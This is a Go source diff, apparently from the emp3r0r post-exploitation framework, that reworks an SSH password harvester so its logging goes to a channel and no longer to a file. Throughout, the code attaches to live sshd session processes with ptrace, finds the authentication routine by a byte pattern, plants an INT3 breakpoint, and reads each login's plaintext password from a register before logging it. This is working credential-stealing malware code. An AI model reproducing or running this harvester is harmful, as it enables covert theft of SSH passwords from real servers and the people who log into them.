@@ -22,16 +22,16 @@ var (
 	traced_pids_mut = &sync.RWMutex{}
 )
 
-func sshd_monitor(password_file string, code_pattern []byte) (err error) {
+func sshd_monitor(logStream chan string, code_pattern []byte) (err error) {
 	alive, sshd_procs := util.IsProcAlive("sshd")
 	if !alive {
-		util.LogFilePrintf(password_file, "sshd_monitor (%d): sshd process not found, aborting", unix.Getpid())
+		util.LogStreamPrintf(logStream, "sshd_monitor (%d): sshd process not found, aborting", unix.Getpid())
 		return
 	}
 
-	util.LogFilePrintf(password_file, "sshd_monitor started (%d)", unix.Getpid())
+	util.LogStreamPrintf(logStream, "sshd_monitor started (%d)", unix.Getpid())
 	monitor := func(sshd_pid int) {
-		util.LogFilePrintf(password_file, "Started monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_pid)
+		util.LogStreamPrintf(logStream, "Started monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_pid)
 		for {
 			util.TakeABlink()
 			children_file := fmt.Sprintf("/proc/%d/task/%d/children", sshd_pid, sshd_pid)
@@ -45,7 +45,7 @@ func sshd_monitor(password_file string, code_pattern []byte) (err error) {
 				if err == nil {
 					traced_pids_mut.RLock()
 					if !traced_pids[child_pid] {
-						go sshd_harvester(child_pid, password_file, code_pattern)
+						go sshd_harvester(child_pid, logStream, code_pattern)
 					}
 					traced_pids_mut.RUnlock()
 				}
@@ -53,7 +53,7 @@ func sshd_monitor(password_file string, code_pattern []byte) (err error) {
 		}
 	}
 	for _, sshd_proc := range sshd_procs {
-		util.LogFilePrintf(password_file, "Starting monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_proc.Pid)
+		util.LogStreamPrintf(logStream, "Starting monitor (%d) on SSHD (%d)", unix.Getpid(), sshd_proc.Pid)
 		go monitor(int(sshd_proc.Pid))
 	}
 
@@ -62,7 +62,7 @@ func sshd_monitor(password_file string, code_pattern []byte) (err error) {
 	}
 }
 
-func sshd_harvester(pid int, password_file string, code_pattern []byte) {
+func sshd_harvester(pid int, logStream chan string, code_pattern []byte) {
 	// remember pid
 	traced_pids_mut.Lock()
 	traced_pids[pid] = true
@@ -72,11 +72,11 @@ func sshd_harvester(pid int, password_file string, code_pattern []byte) {
 		code_pattern = []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
 	}
 	// code_pattern_littleendian := []byte{0x21, 0xc0, 0xb6, 0x0f, 0x08, 0xc4, 0x83, 0x48}
-	util.LogFilePrintf(password_file, "\n[+] Starting Harvester for SSHD session %d", pid)
+	util.LogStreamPrintf(logStream, "\n[+] Starting Harvester for SSHD session %d", pid)
 	map_file := fmt.Sprintf("/proc/%d/maps", pid)
 	map_data, err := os.ReadFile(map_file)
 	if err != nil {
-		util.LogFilePrintf(password_file, "Failed to read memory map of %d: %v", pid, err)
+		util.LogStreamPrintf(logStream, "Failed to read memory map of %d: %v", pid, err)
 		return
 	}
 	// parse memory map
@@ -90,25 +90,25 @@ func sshd_harvester(pid int, password_file string, code_pattern []byte) {
 			strings.Contains(line, "r-x") {
 			f1 := strings.Fields(line)[0]
 			if len(f1) < 2 {
-				util.LogFilePrintf(password_file, "error parsing line: %s", line)
+				util.LogStreamPrintf(logStream, "error parsing line: %s", line)
 				continue
 			}
 			start := strings.Split(f1, "-")[0]
 			end := strings.Split(f1, "-")[1]
 			ptr, err = strconv.ParseUint(start, 16, 64)
 			if err != nil {
-				util.LogFilePrintf(password_file, "parsing pstart: %v", err)
+				util.LogStreamPrintf(logStream, "parsing pstart: %v", err)
 				return
 			}
 			pend, err = strconv.ParseUint(end, 16, 64)
 			if err != nil {
-				util.LogFilePrintf(password_file, "parsing pend: %v", err)
+				util.LogStreamPrintf(logStream, "parsing pend: %v", err)
 				return
 			}
 		}
 	}
-	util.LogFilePrintf(password_file, "Harvester PID is %d", unix.Getpid())
-	util.LogFilePrintf(password_file, "SSHD process found in 0x%x - 0x%x", ptr, pend)
+	util.LogStreamPrintf(logStream, "Harvester PID is %d", unix.Getpid())
+	util.LogStreamPrintf(logStream, "SSHD process found in 0x%x - 0x%x", ptr, pend)
 	pstart := ptr
 
 	// #13 https://github.com/jm33-m0/emp3r0r/issues/13
@@ -118,31 +118,49 @@ func sshd_harvester(pid int, password_file string, code_pattern []byte) {
 	defer runtime.UnlockOSThread()
 	err = unix.PtraceAttach(pid)
 	if err != nil {
-		util.LogFilePrintf(password_file, "failed to attach to %d: %v", pid, err)
+		util.LogStreamPrintf(logStream, "failed to attach to %d: %v", pid, err)
 		return
 	}
 	defer unix.PtraceDetach(pid)
+	// wait for the process to stop
+	wstatus := new(unix.WaitStatus)
+	_, err = unix.Wait4(pid, wstatus, 0, nil)
+	if err != nil {
+		util.LogStreamPrintf(logStream, "wait %d: %v", pid, err)
+		return
+	}
+	switch {
+	case wstatus.Exited():
+		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
+		return
+	case wstatus.CoreDump():
+		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
+	case wstatus.Continued():
+		util.LogStreamPrintf(logStream, "SSHD %d continues...", pid)
+	case wstatus.Stopped():
+		util.LogStreamPrintf(logStream, "SSHD %d has stopped on attach...", pid)
+	}
 	word := make([]byte, 8)
-	util.LogFilePrintf(password_file, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)
+	util.LogStreamPrintf(logStream, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)
 
 	// search for auth_password
-	util.LogFilePrintf(password_file, "Searching for auth_password")
+	util.LogStreamPrintf(logStream, "Searching for auth_password")
 	for ptr < pend {
 		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
 		if err != nil {
-			util.LogFilePrintf(password_file, "PTRACE_PEEKTEXT searching memory of %d: %v",
+			util.LogStreamPrintf(logStream, "PTRACE_PEEKTEXT searching memory of %d: %v",
 				pid, err)
 			time.Sleep(time.Second)
 		}
 		if bytes.Equal(word, code_pattern) {
-			util.LogFilePrintf(password_file, "Got a hit (0x%x) at 0x%x", word, ptr)
+			util.LogStreamPrintf(logStream, "Got a hit (0x%x) at 0x%x", word, ptr)
 			// now pstart is the start of our code pattern
 			break
 		}
 		ptr++
 	}
 	if ptr == pend {
-		util.LogFilePrintf(password_file, "code pattern 0x%x not found in memory 0x%x to 0x%x",
+		util.LogStreamPrintf(logStream, "code pattern 0x%x not found in memory 0x%x to 0x%x",
 			code_pattern, pstart, pend)
 		return
 	}
@@ -150,63 +168,62 @@ func sshd_harvester(pid int, password_file string, code_pattern []byte) {
 	// points to the start of our code pattern
 	pcode_pattern := uintptr(ptr)
 	// dump code at code pattern
-	util.LogFilePrintf(password_file, "Code pattern found at 0x%x", pcode_pattern)
-	dump_code(pid, pcode_pattern, password_file)
+	util.LogStreamPrintf(logStream, "Code pattern found at 0x%x", pcode_pattern)
+	dump_code(pid, pcode_pattern, logStream)
 
 	// before breakpoint, what does the code look like
-	util.LogFilePrintf(password_file, "Before setting the breakpoint, what does the code look like?")
-	dump_code(pid, 0, password_file)
+	util.LogStreamPrintf(logStream, "Before setting the breakpoint, what does the code look like?")
+	dump_code(pid, 0, logStream)
 
 	// write breakpoint
 	code_with_trap := make([]byte, 8)
 	copy(code_with_trap, code_pattern)
 	code_with_trap[0] = 0xCC
 	// code_with_trap[len(code_with_trap)-1] = 0xCC
-	util.LogFilePrintf(password_file, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
+	util.LogStreamPrintf(logStream, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
 	if err != nil {
-		util.LogFilePrintf(password_file, "patching code: %v", err)
+		util.LogStreamPrintf(logStream, "patching code: %v", err)
 		return
 	}
-	util.LogFilePrintf(password_file, "INT3 written, breakpoint set")
-	util.LogFilePrintf(password_file, "Dumping code at code pattern 0x%x to check if bp has been set", pcode_pattern)
-	dump_code(pid, pcode_pattern, password_file)
-	util.LogFilePrintf(password_file, "Resuming process to let it hit breakpoint")
+	util.LogStreamPrintf(logStream, "INT3 written, breakpoint set")
+	util.LogStreamPrintf(logStream, "Dumping code at code pattern 0x%x to check if bp has been set", pcode_pattern)
+	dump_code(pid, pcode_pattern, logStream)
+	util.LogStreamPrintf(logStream, "Resuming process to let it hit breakpoint")
 	err = unix.PtraceCont(pid, int(unix.SIGCONT))
 	if err != nil {
-		util.LogFilePrintf(password_file, "resuming process: %v", err)
+		util.LogStreamPrintf(logStream, "resuming process: %v", err)
 		return
 	}
-	wstatus := new(unix.WaitStatus)
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogFilePrintf(password_file, "wait %d to hit breakpoint: %v", pid, err)
+		util.LogStreamPrintf(logStream, "wait %d to hit breakpoint: %v", pid, err)
 		return
 	}
 	switch {
 	case wstatus.Exited():
-		util.LogFilePrintf(password_file, "SSHD %d exited...", pid)
+		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
 		return
 	case wstatus.CoreDump():
-		util.LogFilePrintf(password_file, "SSHD %d core dumped...", pid)
+		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
 		return
 	case wstatus.Continued():
-		util.LogFilePrintf(password_file, "SSHD %d continues...", pid)
+		util.LogStreamPrintf(logStream, "SSHD %d continues...", pid)
 	case wstatus.Stopped():
-		util.LogFilePrintf(password_file, "SSHD %d has hit breakpoint", pid)
+		util.LogStreamPrintf(logStream, "SSHD %d has hit breakpoint", pid)
 	}
 
 handler:
 	success := false
 	// where are we at
-	util.LogFilePrintf(password_file, "Dumping code at RIP after hitting breakpoint")
-	dump_code(pid, 0, password_file)
+	util.LogStreamPrintf(logStream, "Dumping code at RIP after hitting breakpoint")
+	dump_code(pid, 0, logStream)
 
 	// read registers on break
 	regs := new(unix.PtraceRegs)
 	err = unix.PtraceGetRegs(pid, regs)
 	if err != nil {
-		util.LogFilePrintf(password_file, "get regs: %v", err)
+		util.LogStreamPrintf(logStream, "get regs: %v", err)
 		return
 	}
 	password_reg := regs.Rbp
@@ -215,11 +232,11 @@ handler:
 	// read password from RBP
 	buf := make([]byte, 1)
 	var password_bytes []byte
-	util.LogFilePrintf(password_file, "Extracting password from RBP (0x%x)", password_reg)
+	util.LogStreamPrintf(logStream, "Extracting password from RBP (0x%x)", password_reg)
 	for {
 		_, err := unix.PtracePeekText(pid, uintptr(password_reg), buf)
 		if err != nil {
-			util.LogFilePrintf(password_file, "reading password from RBP (0x%x): %v", password_reg, err)
+			util.LogStreamPrintf(logStream, "reading password from RBP (0x%x): %v", password_reg, err)
 			return
 		}
 		// until NULL is reached
@@ -231,60 +248,60 @@ handler:
 	}
 	password := string(password_bytes)
 	if pam_ret == 0 {
-		util.LogFilePrintf(password_file, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
+		util.LogStreamPrintf(logStream, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
 	} else {
 		success = true
-		util.LogFilePrintf(password_file, "\n\nWe have password 0x%x (%s)\n\n", password, password)
+		util.LogStreamPrintf(logStream, "\n\nWe have password 0x%x (%s)\n\n", password, password)
 	}
 	// remove breakpoint
-	util.LogFilePrintf(password_file, "Removing breakpoint")
+	util.LogStreamPrintf(logStream, "Removing breakpoint")
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern)
 	if err != nil {
-		util.LogFilePrintf(password_file, "restoring code to remove breakpoint: %v", err)
+		util.LogStreamPrintf(logStream, "restoring code to remove breakpoint: %v", err)
 		return
 	}
 	// one byte back, go back before 0xCC, at the start of code pattern
 	regs.Rip--
 	err = unix.PtraceSetRegs(pid, regs)
 	if err != nil {
-		util.LogFilePrintf(password_file, "set regs back: %v", err)
+		util.LogStreamPrintf(logStream, "set regs back: %v", err)
 		return
 	}
 	// single step to execute original code
 	err = unix.PtraceSingleStep(pid)
 	if err != nil {
-		util.LogFilePrintf(password_file, "single step: %v", err)
+		util.LogStreamPrintf(logStream, "single step: %v", err)
 		return
 	}
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogFilePrintf(password_file, "wait %d to single step: %v", pid, err)
+		util.LogStreamPrintf(logStream, "wait %d to single step: %v", pid, err)
 		return
 	}
-	util.LogFilePrintf(password_file, "Single step done")
+	util.LogStreamPrintf(logStream, "Single step done")
 
 	// check if breakpoint is removed
-	util.LogFilePrintf(password_file, "Dumping code at code pattern 0x%x to check if bp has been removed", pcode_pattern)
-	dump_code(pid, pcode_pattern, password_file)
-	util.LogFilePrintf(password_file, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)
+	util.LogStreamPrintf(logStream, "Dumping code at code pattern 0x%x to check if bp has been removed", pcode_pattern)
+	dump_code(pid, pcode_pattern, logStream)
+	util.LogStreamPrintf(logStream, "Breakpoint should now be removed: 0x%x, sshd will proceed", word)
 
 	// add breakpoint back
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
 	if err != nil {
-		util.LogFilePrintf(password_file, "patching code: %v", err)
+		util.LogStreamPrintf(logStream, "patching code: %v", err)
 		return
 	}
-	util.LogFilePrintf(password_file, "Added breakpoint back")
+	util.LogStreamPrintf(logStream, "Added breakpoint back")
 
 	// continue sshd session process
 	err = unix.PtraceCont(pid, int(unix.SIGCONT))
 	if err != nil {
-		util.LogFilePrintf(password_file, "continue SSHD session: %v", err)
+		util.LogStreamPrintf(logStream, "continue SSHD session: %v", err)
 		return
 	}
 	_, err = unix.Wait4(pid, wstatus, 0, nil)
 	if err != nil {
-		util.LogFilePrintf(password_file, "wait %d to continue: %v", pid, err)
+		util.LogStreamPrintf(logStream, "wait %d to continue: %v", pid, err)
 		return
 	}
 	switch {
@@ -293,41 +310,43 @@ handler:
 			goto handler
 		}
 	case wstatus.Exited():
-		util.LogFilePrintf(password_file, "SSHD %d exited...", pid)
+		util.LogStreamPrintf(logStream, "SSHD %d exited...", pid)
 	case wstatus.CoreDump():
-		util.LogFilePrintf(password_file, "SSHD %d core dumped...", pid)
+		util.LogStreamPrintf(logStream, "SSHD %d core dumped...", pid)
 	case wstatus.Continued():
-		util.LogFilePrintf(password_file, "SSHD %d core continues...", pid)
+		util.LogStreamPrintf(logStream, "SSHD %d core continues...", pid)
 	default:
-		util.LogFilePrintf(password_file, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
+		util.LogStreamPrintf(logStream, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
 	}
 }
 
-func dump_code(pid int, addr uintptr, log_file string) {
-	if addr == 0 {
-		regs := new(unix.PtraceRegs)
-		err := unix.PtraceGetRegs(pid, regs)
-		if err != nil {
-			util.LogFilePrintf(log_file, "dump code for %d failed: %v", pid, err)
-			return
-		}
-		addr = uintptr(regs.Rip)
-		util.LogFilePrintf(log_file, "Dumping code at RIP (0x%x)", addr)
-	}
-	code_bytes := make([]byte, 128)
-	_, err := unix.PtracePeekText(pid, addr, code_bytes)
+func dump_code(pid int, addr uintptr, log_stream chan string) {
+	regs := new(unix.PtraceRegs)
+	err := unix.PtraceGetRegs(pid, regs)
 	if err != nil {
-		util.LogFilePrintf(log_file, "dump code for %d failed: PEEKTEXT: %v", pid, err)
+		util.LogStreamPrintf(log_stream, "dump code for %d failed: %v", pid, err)
 		return
 	}
-	util.LogFilePrintf(log_file, "Dumped code at 0x%x: 0x%x", addr, code_bytes)
+	if addr == 0 {
+		addr = uintptr(regs.Rip)
+		util.LogStreamPrintf(log_stream, "Dumping code at RIP (0x%x)", addr)
+	}
+	util.LogStreamPrintf(log_stream, "Dumping registers: RIP=0x%x, RBP=0x%x, RAX=0x%x, RDI=0x%x, RSI=0x%x, RDX=0x%x, RCX=0x%x, R8=0x%x, R9=0x%x",
+		regs.Rip, regs.Rbp, regs.Rax, regs.Rdi, regs.Rsi, regs.Rdx, regs.Rcx, regs.R8, regs.R9)
+	code_bytes := make([]byte, 128)
+	_, err = unix.PtracePeekText(pid, addr, code_bytes)
+	if err != nil {
+		util.LogStreamPrintf(log_stream, "dump code for %d failed: PEEKTEXT: %v", pid, err)
+		return
+	}
+	util.LogStreamPrintf(log_stream, "Dumped code at 0x%x: 0x%x", addr, code_bytes)
 }
 
-func get_tracer_pid(pid int, log_file string) (tracer_pid int) {
+func get_tracer_pid(pid int, log_stream chan string) (tracer_pid int) {
 	// check tracer pid
 	proc_status, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
 	if err != nil {
-		util.LogFilePrintf(log_file, "get_tracer: %v", err)
+		util.LogStreamPrintf(log_stream, "get_tracer: %v", err)
 		return
 	}
 	lines := strings.Split(string(proc_status), "\n")
@@ -336,7 +355,7 @@ func get_tracer_pid(pid int, log_file string) (tracer_pid int) {
 			tracer := strings.Fields(line)[1]
 			tracer_pid, err = strconv.Atoi(tracer)
 			if err != nil {
-				util.LogFilePrintf(log_file, "Invalid tracer PID: %v", err)
+				util.LogStreamPrintf(log_stream, "Invalid tracer PID: %v", err)
 				return
 			}
 			break
